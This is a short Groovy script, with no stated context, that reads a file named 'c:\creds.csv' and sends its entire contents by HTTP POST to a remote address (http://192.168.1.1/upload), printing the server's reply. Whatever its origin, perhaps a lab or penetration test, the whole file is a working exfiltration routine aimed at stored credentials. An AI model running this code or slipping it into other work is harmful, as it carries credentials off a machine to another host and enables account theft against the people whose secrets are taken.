import java.net.URL
import java.io.File

// Read file contents
def file = new File("c:\\creds.csv")
def fileContents = file.text // Reads entire file content as a String

// URL of the remote server
def url = new URL("http://192.168.1.1/upload")

// Open a connection
HttpURLConnection connection = (HttpURLConnection) url.openConnection()
connection.setRequestMethod("POST")
connection.setDoOutput(true)
connection.setRequestProperty("Content-Type", "text/plain") // Adjust this based on your file type

// Write file content to the request body
connection.outputStream.withWriter("UTF-8") { writer ->
    writer.write(fileContents)
}

// Get response code
def responseCode = connection.responseCode
println "Response Code: ${responseCode}"

// Get the response
if (responseCode == HttpURLConnection.HTTP_OK) {
    def response = connection.inputStream.text
    println "Response: ${response}"
} else {
    def errorResponse = connection.errorStream?.text
    println "Error: ${errorResponse}"
}
